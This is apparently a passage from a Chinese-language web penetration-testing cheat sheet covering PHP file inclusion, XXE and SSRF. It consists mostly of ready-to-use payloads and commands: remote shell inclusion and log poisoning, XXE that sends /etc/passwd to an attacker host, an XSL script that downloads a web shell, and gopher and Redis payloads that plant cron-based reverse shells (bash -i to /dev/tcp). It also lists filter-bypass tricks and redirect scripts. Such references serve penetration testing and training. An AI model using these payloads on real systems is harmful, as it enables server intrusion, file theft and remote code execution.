下载web文件
/1.php?f=../../etc/passwd
/1.php?f=file:///etc/passwd(file://绕过../的防护)
/1.php?f=file:///etc/passwd
</code></pre><h4 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h4><pre><code>函数:
include
require
include_once
require_once
</code></pre><h5 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h5><pre><code>file:// — 访问本地文件系统
file协议的工作目录是当前目录，使用file:///wwwroot/1.php等同于./wwwroot/1.php可用于绕过一些情况
php:// — 访问各个输入/输出流（I/O streams）
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/3.png~webp" alt="image"></p>
<pre><code>读取
/1.php?file=php://filter/read=convert.base64-encode/resource=./1.php
写入
/1.php?file=php://filter/write=convert.base64-decode/resource=[file]&quot;,&quot;base64
</code></pre><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><pre><code>https://github.com/D35m0nd142/LFISuite
</code></pre><h6 id="allow-url-include-开启时Getshell"><a href="#allow-url-include-开启时Getshell" class="headerlink" title="allow_url_include 开启时Getshell"></a>allow_url_include 开启时Getshell</h6><pre><code>远程文件包含
/1.php?file=http://remote.com/shell.txt
/1.php?file=php://input  POST:&lt;?php phpinfo();?&gt;
或使用curl
&gt;curl -v &quot;http://127.0.0.1:8888/ctf/cli/3.php?file=php://input&quot; -d &quot;&lt;?php phpinfo();?&gt;&quot;
或使用data://协议解析base64的代码
/1.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg==
</code></pre><h6 id="allow-url-include-关闭时Getshell"><a href="#allow-url-include-关闭时Getshell" class="headerlink" title="allow_url_include 关闭时Getshell"></a>allow_url_include 关闭时Getshell</h6><pre><code>攻击机开启共享
/1.php?file=//attacker/1.php
创建webdav服务，shell文件放入目录包含即可
&gt;docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav
Shell文件放入/root/webdav/data
/1.php?file=//attacker/1.php
</code></pre><h6 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h6><pre><code>Fuzz文件
https://github.com/fuzzdb-project/fuzzdb
https://github.com/danielmiessler/SecLists
https://blog.csdn.net/qq_33020901/article/details/78810035
/1.php?file=&lt;?php phpinfo();?&gt;
/1.php?file=../../../../../../../var/log/apache2/access.log
Win下使用phpstudy
请求/&lt;?php phpinfo();?&gt;
包含错误日志
/1.php?file=C:\phpStudy\Apache\logs\error.log
</code></pre><h6 id="上传个图片格式的木马直接包含"><a href="#上传个图片格式的木马直接包含" class="headerlink" title="上传个图片格式的木马直接包含"></a>上传个图片格式的木马直接包含</h6><pre><code>/1.php?file=/uploadfile/1.jpg
</code></pre><h6 id="限制后缀时"><a href="#限制后缀时" class="headerlink" title="限制后缀时"></a>限制后缀时</h6><pre><code>&lt;?php
$file = $_GET[&#39;file&#39;].&quot;.php&quot;;
include($file);
?&gt;&lt;br&gt;
利用伪协议zip，构造一个zip压缩包，打包一个shell.php，将压缩包更名为png
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/4.png~webp" alt="image"></p>
<pre><code>请求/1.php?file=zip://shell.png%23shell
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/5.png~webp" alt="image"></p>
<pre><code>也可使用phar协议访问
/1.php?file=phar://shell.png/shell
老版本可以使用%00截断
/etc/passwd%00
(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)
/var/www/%00
/etc/passwd/././././././.[…]/./././././.
(需要 magic_quotes_gpc=off
(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)
点号截断：
/boot.ini/………[…]…………
(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)
</code></pre><h6 id="phpinfo-LFI-本地文件包含临时文件getshell"><a href="#phpinfo-LFI-本地文件包含临时文件getshell" class="headerlink" title="phpinfo-LFI 本地文件包含临时文件getshell"></a>phpinfo-LFI 本地文件包含临时文件getshell</h6><pre><code>利用临时文件删除时间差获取shell
需要一个lfi漏洞+phpinfo页面
在/tmp/目录下生成个密码为f的一句话木马g
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/6.png~webp" alt="image"></p>
<pre><code>修改脚本的phpinfo文件名称
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/7.png~webp" alt="image"></p>
<pre><code>LFI文件
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/8.png~webp" alt="image"></p>
<pre><code>执行
&gt;python getshell.py 192.168.0.108 80 100
80是端口、100是线程
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/9.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/10.png~webp" alt="image"></p>
<pre><code>http://192.168.0.110/index.php?file=../../../tmp/g&amp;f=echo%20%271%27
</code></pre><h6 id="session-lfi-getshell"><a href="#session-lfi-getshell" class="headerlink" title="session + lfi getshell"></a>session + lfi getshell</h6><pre><code>session.upload_progress.enabled启用时，文件上传会产生进度文件
/var/lib/php5/sess_
/var/lib/php/sess_
</code></pre><h6 id="LFI-SSH-Log"><a href="#LFI-SSH-Log" class="headerlink" title="LFI SSH Log"></a>LFI SSH Log</h6><pre><code>&gt;ssh &#39;&lt;?php system($_GET[&#39;c&#39;]); ?&gt;&#39;@192.168.0.107
&gt;http://192.168.0.107/lfi.php?file=/var/log/auth.log&amp;c=ls
</code></pre><h6 id="RFI-amp-命令注入上线MSF"><a href="#RFI-amp-命令注入上线MSF" class="headerlink" title="RFI&amp;命令注入上线MSF"></a>RFI&amp;命令注入上线MSF</h6><pre><code>MSF生成
#use exploit/multi/script/web_delivery
#set target PHP
注入点注入：
php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&#39;http://192.168.0.107:1234/OgsOFaj3yKH&#39;));&quot;
RFI：
http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH
</code></pre><h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><pre><code>XML设计的宗旨是传输数据，而非显示数据
XXE=XML外部实体注入、XML=可扩展标记语言
Xml文件声明
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
DTD为XML的文档类型定义
引入外部DTD
&lt;!DOCTYPE 根元素 SYSTEM &quot;filename&quot;&gt;
参数实体+外部实体
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    %file;
]&gt;
</code></pre><h5 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h5><pre><code>闭合标签，改写xml文件，用户可控，有拼接代码
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manager&gt;
    &lt;admin id=&quot;1&quot;&gt;
&lt;username&gt;admin&lt;/username&gt;
&lt;password&gt;admin&lt;/password&gt;
&lt;/admin&gt;
&lt;admin id=&quot;2&quot;&gt;
&lt;username&gt;root&lt;/username&gt;
&lt;password&gt;root&lt;/password&gt;
&lt;/admin&gt;
&lt;/manager&gt;
若是password可控，拼接代码形成注入
admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;
</code></pre><h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><pre><code>https://github.com/AonCyberLabs/xxe-recursive-download
程序解析XML输入时，未禁止外部实体的加载，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害
</code></pre><h6 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h6><pre><code>回显路径
    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;test&quot;&gt;%remote;]&gt;
DNSLOG
    http://www.dnslog.cn/
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY dtd SYSTEM &quot;http://xxx.dnslog.cn/xxe&quot;&gt;]&gt;
&lt;xxe&gt;&amp;dtd;&lt;/xxe&gt;
Webdav
    存在webdav可使用PROPPATCH、PROPFIND、 LOCK等请求方法接受xml输入形成xxe
Wsdl使用AWVS测试
</code></pre><h6 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h6><pre><code>如遇与xml交互的地方
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY test &quot;this is test&quot;&gt; 
]&gt; 
&lt;root&gt;&amp;test;&lt;/root&gt;
看是否输出
检查是否支持外部实体
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY % foo SYSTEM &quot;http://attacker/evil.xml&quot;&gt; 
%foo;
]&gt; 
查看你的服务器是否有请求
JSON content-type XXE
修改Content-Type: application/xml
X-Requested-With: XMLHttpRequest
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;root&gt;
&lt;参数name&gt;name&lt;/参数name&gt;
&lt;参数value&gt;&amp;xxe;&lt;/ 参数value&gt;
&lt;/root&gt;
</code></pre><h6 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h6><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM &quot;file:////etc/passwd&quot;&gt; ]&gt; 
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
也可去掉文件列目录
file:///root/.sh/id_rsa
特殊字符
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
&lt;!ENTITY % goodies SYSTEM &quot;file:////tmp/xxx.txt&quot;&gt;  
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt; 
%dtd; ]&gt; 
&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
evil.dtd
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</code></pre><h6 id="Blind-OOB-XXE无回显读取"><a href="#Blind-OOB-XXE无回显读取" class="headerlink" title="Blind OOB XXE无回显读取"></a>Blind OOB XXE无回显读取</h6><pre><code>需使用参数实体，引用外部DTD
Payload
&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
%remote;%int;%send;
]&gt;
test.dtd
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://attacker:9999?p=%file;&#39;&gt;&quot;&gt;
</code></pre><h6 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h6><pre><code>远程payload
&lt;!ENTITY % a SYSTEM &quot;file:///&quot;&gt; &lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &#39;gopher://ip:80/%a;&#39;&gt;&quot;&gt; %b; %c;
注入payload
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://attacker:80/1.xml&quot;&gt;%remote;]&gt;&lt;root/&gt;
</code></pre><h6 id="不同平台支持的协议"><a href="#不同平台支持的协议" class="headerlink" title="不同平台支持的协议"></a>不同平台支持的协议</h6><p><img src="https://qiniucdn.rhinelab.top/img/20220214/11.png~webp" alt="image"></p>
<h6 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h6><pre><code>安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre><h6 id="内网主机探测"><a href="#内网主机探测" class="headerlink" title="内网主机探测"></a>内网主机探测</h6><pre><code>可先读取/etc/network/interfaces、/proc/net/arp、/etc/hosts等文件查询IP段
使用脚本
</code></pre><h6 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h6><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  
&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  
&lt;!ELEMENT data (#PCDATA)&gt;  
]&gt;
&lt;data&gt;4&lt;/data&gt;
可使用burpsuite的intruder模块进行遍历
</code></pre><h6 id="内部DTD利用"><a href="#内部DTD利用" class="headerlink" title="内部DTD利用"></a>内部DTD利用</h6><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h6><pre><code>    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
    &lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;
%local_dtd;
</code></pre><h6 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h6><pre><code>&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;
&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;
%local_dtd;
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE message [
&lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;

&lt;!ENTITY % condition &#39;aaa)&gt;
    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
    &amp;#x25;eval;
    &amp;#x25;error;
    &lt;!ELEMENT aa (bb&#39;&gt;

%local_dtd;
]&gt;
&lt;message&gt;any text&lt;/message&gt;
</code></pre><h6 id="XXE写shell"><a href="#XXE写shell" class="headerlink" title="XXE写shell"></a>XXE写shell</h6><pre><code>当XXE支持XSL时
&lt;?xml version=&#39;1.0&#39;?&gt;
&lt;xsl:stylesheet version=&quot;1.0&quot;
xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;
xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;
&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;user&quot;&gt;
&lt;![CDATA[
public string xml()
&#123;
    System.Net.WebClient webClient = new System.Net.WebClient();
    webClient.DownloadFile(&quot;https://x.x.x.x/shell.txt&quot;,
                   @&quot;c:\inetpub\wwwroot\shell.aspx&quot;);

return &quot;Exploit Success&quot;;
&#125;
]]&gt;
&lt;/msxsl:script&gt;
&lt;xsl:template match=&quot;/&quot;&gt;
&lt;xsl:value-of select=&quot;user:xml()&quot;/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><pre><code>服务端请求伪造
构造一个由服务器发出请求的漏洞
服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制
</code></pre><h5 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h5><pre><code>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞
</code></pre><h5 id="挖掘-1"><a href="#挖掘-1" class="headerlink" title="挖掘"></a>挖掘</h5><pre><code>转码服务
在线翻译
获取超链接的标题等内容进行显示
请求远程服务器资源的地方，图片加载与下载(通过URL地址加载或下载图片)
图片、文章收藏功能
对外发起网络请求的地方，网站采集、网页抓取的地方。
头像 (远程加载头像)
一切要你输入网址的地方和可以输入ip的地方。
数据库内置功能(mongodb的copyDatabase函数)
邮件系统
文件处理
在线处理工具
从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain
</code></pre><h6 id="XML-1"><a href="#XML-1" class="headerlink" title="XML"></a>XML</h6><pre><code>&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/evil.dtd&quot;&gt;
&lt;!ENTITY % file system &quot;file:///etc/passwd&quot; &gt;
&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/file?data=%file&quot;&gt;
&lt;!DOCTYPE roottag PUBLIC &quot;-//VSR//PENTEST//EN&quot; &quot;http://wuyun.org/urlin&quot;&gt;
&lt;xenc:AgreementMethod Algorithm= &quot;http://wuyun.org/1&quot;&gt;
&lt;xenc:EncryptionProperty Target= &quot;http://wuyun.org/2&quot;&gt;
&lt;xenc:CipherReference URI= &quot;http://wuyun.org/3&quot;&gt;
&lt;xenc:DataReference URI= &quot;http://wuyun.org/4&quot;&gt;
&lt;Reference URI=&quot;http://wuyun.org/5&quot;&gt;
&lt;To xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;http://wuyun.org/to&lt;/To&gt;
&lt;ReplyTo xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;
&lt;Address&gt;http://wuyun.org/rto&lt;/Address&gt;
&lt;input message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/ip&quot; /&gt;
&lt;output message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/op&quot; /&gt;
&lt;wsp:PolicyReference URI=“http://wuyun.org/pr&quot;&gt;
&lt;fed:Federation FederationID=&quot;http://wuyun.org/fid&quot;&gt;
&lt;fed:FederationInclude&gt;http://wuyun.org/inc&lt;/fed:FederationInclude&gt;
&lt;fed:TokenIssuerName&gt;http://wuyun.org/iss&lt;/fed:TokenIssuerName&gt;
&lt;mex:MetadataReference&gt;
&lt;wsa:Address&gt;http://wuyun.org/mex&lt;/wsa:Address&gt;
&lt;/mex:MetadataReference&gt;
&lt;edmx:Reference URI=&quot;http://wuyun.org/edmxr&quot;&gt;
&lt;edmx:AnnotationsReference URI=&quot;http://wuyun.org/edmxa&quot;&gt;
&lt;xbrli:identifier scheme=&quot;http://wuyun.org/xbr&quot;&gt;
&lt;link:roleType roleURI=&quot;http://wuyun.org/role&quot;&gt;
&lt;stratml:Source&gt;http://wuyun.org/stml&lt;/stratml:Source&gt;
</code></pre><h6 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h6><h6 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h6><pre><code>db.copyDatabase(&#39;\r\nconfig set dbfilename ssrf\r\nquit\r\n’,&#39;test&#39;,&#39;10.6.4.166:6379&#39;)
</code></pre><h6 id="PostgresSQL"><a href="#PostgresSQL" class="headerlink" title="PostgresSQL"></a>PostgresSQL</h6><pre><code>SELECT dblink_send_query(
 &#39;host=127.0.0.1 
dbname=quit 
user=\&#39;\r\nconfig set dbfilename wyssrf\r\n\quit\r\n&#39; 
password=1 port=6379 sslmode=disable&#39;, 
&#39;select version();’ 
);
</code></pre><h6 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>SELECT openrowset(&#39;SQLOLEDB&#39;, &#39;server=192.168.1.5;uid=sa;pwd=sa;database=master&#39;)
SELECT * FROM OpenDatasource(&#39;SQLOLEDB&#39;, &#39;Data Source=ServerName;User ID=sa;Password=sa&#39; ) .Northwind.dbo.Categories
</code></pre><h6 id="图片处理函数"><a href="#图片处理函数" class="headerlink" title="图片处理函数"></a>图片处理函数</h6><pre><code>FFmpeg
concat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd
ImageMagick
fill &#39;url(http://wyssrf.wuyun.org)&#39;
</code></pre><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><pre><code>测试代码,需安装phpcurl模块apt-get install php7.0-curl
&lt;?php
echo &#39;r u ok?&#39;;
function curl($url)&#123;  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
&#125;
$url = $_GET[&#39;url&#39;];
curl($url);
?&gt;
对内网、本地进行端口扫描，获取服务的banner 信息
攻击运行在内网或本地的应用程序
对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)
攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)
读取内网资源(如：利用file协议读取本地文件等)
跳板
无视cdn
利用Redis未授权访问，HTTP CRLF注入实现getshell
</code></pre><h6 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h6><pre><code>&gt;curl -v &#39;http://192.168.0.110/ssrf.php?url=file:///etc/passwd&#39;
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/12.png~webp" alt="image"></p>
<pre><code>?url=php://filter/read=convert.base64-encode/resource=./1.php
</code></pre><h5 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h5><pre><code>&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=dict://127.0.0.1:22/&#39;
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/13.png~webp" alt="image"></p>
<pre><code>&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=dict://127.0.0.1:6379/info&#39;
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/14.png~webp" alt="image"></p>
<h6 id="SSRF-Redis"><a href="#SSRF-Redis" class="headerlink" title="SSRF+Redis"></a>SSRF+Redis</h6><pre><code>&gt;curl -v &#39;http://192.168.0.112/ssrf.php?url=gopher://192.168.0.120:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.108%2f12345%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/15.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/16.png~webp" alt="image"></p>
<h6 id="302反弹shell"><a href="#302反弹shell" class="headerlink" title="302反弹shell"></a>302反弹shell</h6><pre><code>?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=flushall
302.php
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$scheme = $_GET[&#39;s&#39;];
$data = $_GET[&#39;data&#39;];
header(&quot;Location: $scheme://$ip:$port/$data&quot;);
?&gt;
?url=http://xxxx/reverse.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;bhost=*.*.*.*&amp;bport=1234
reverse.php
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$bhost = $_GET[&#39;bhost&#39;];
$bport = $_GET[&#39;bport&#39;];
$scheme = $_GET[&#39;s&#39;];
header(&quot;Location: $scheme://$ip:$port/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;);
?&gt;
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dir:/var/spool/cron/
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dbfilename:root
?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=save
可设置burp–&gt;intruder指定变量跑。
</code></pre><h6 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h6><pre><code>https://github.com/FoolMitAh/mysql_gopher_attack
https://fireshellsecurity.team/isitdtu-friss/
</code></pre><h6 id="Weblogic-SSRF-Redis"><a href="#Weblogic-SSRF-Redis" class="headerlink" title="Weblogic SSRF+Redis"></a>Weblogic SSRF+Redis</h6><pre><code>探测
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80
Redis反弹
set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;
config set dir /etc/
config set dbfilename crontab
save
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.0.110:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
SSRF+内网Struct2
http://www.xx.com/ssrf.php?url=http://10.1.1.1/action?action?redirect:http://attackerip/
</code></pre><h6 id="Ueditor-SSRF"><a href="#Ueditor-SSRF" class="headerlink" title="Ueditor SSRF"></a>Ueditor SSRF</h6><pre><code>/editor/ueditor/php/controller.php?action=catchimage&amp;source[]=http://my.ip/?aaa=1%26logo.png
</code></pre><h6 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h6><pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo
</code></pre><h6 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h6><pre><code>直接访问
http://www.xx.com/ssrf.php?url=http://192.168.0.1
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/17.png~webp" alt="image"></p>
<pre><code>伪造POST请求
&gt;curl -v &#39;http://www.xx.com/ssrf.php?url=gopher://192.168.0.10:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%20192.168.220.139%250d%250aUser-Agent:%20curl/7.42.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=bbbbb&#39;
</code></pre><h6 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h6><pre><code>本地绕过
http://127.0.0.1=http://localhost
[::]绕过
http://[::]:80=http://127.0.0.1
@绕过
http://www.xx.com/1.php?url=http://www.xx.com@127.0.0.1:8080
利用短网址
http://tool.chinaz.com/tools/dwz.aspx
http://dwz.cn/
DNS解析
http://www.qq.com.127.0.0.1.xip.io，可解析为127.0.0.1
自己域名设置A记录，指向127.0.0.1
进制转换
127.0.0.1
八进制：0177.0.0.1
十六进制：0x7f.0.0.1
十进制：2130706433
http://www.bejson.com/convert/ip2int/
句号
127。0。0。1
302脚本
&lt;?php
$ip = $_GET[&#39;ip&#39;];
$port = $_GET[&#39;port&#39;];
$scheme = $_GET[&#39;s&#39;];
$data = $_GET[&#39;data&#39;];
header(&quot;Location: $scheme://$ip:$port/$data&quot;);
?&gt;
攻击方VPS监听8080
dict协议
dict://www.attack.com:8080/hello:dict等于
ssrf.php?url=http://attack.com/302.php?s=dict&amp;ip=www.attack.com&amp;port=8080&amp;data=hello:dict
Gopher协议
gopher:// www.attack.com:8080/gopher
ssrf.php?url=http://attack.com/302.php?s=gopher&amp;ip=www.attack.com&amp;port=8080&amp;data=gopher
File协议
攻击机新建file.php
&lt;?php
header(&quot;Location: file:///etc/passwd&quot;);
?&gt;
ssrf.php?url=http://attack.com/file.php
</code></pre><h6 id="gopher协议的脚本转换"><a href="#gopher协议的脚本转换" class="headerlink" title="gopher协议的脚本转换"></a>gopher协议的脚本转换</h6><pre><code>抓取本地测试的正常请求
&gt;socat -v tcp-listen:4444,fork tcp-connect:目标IP:6379
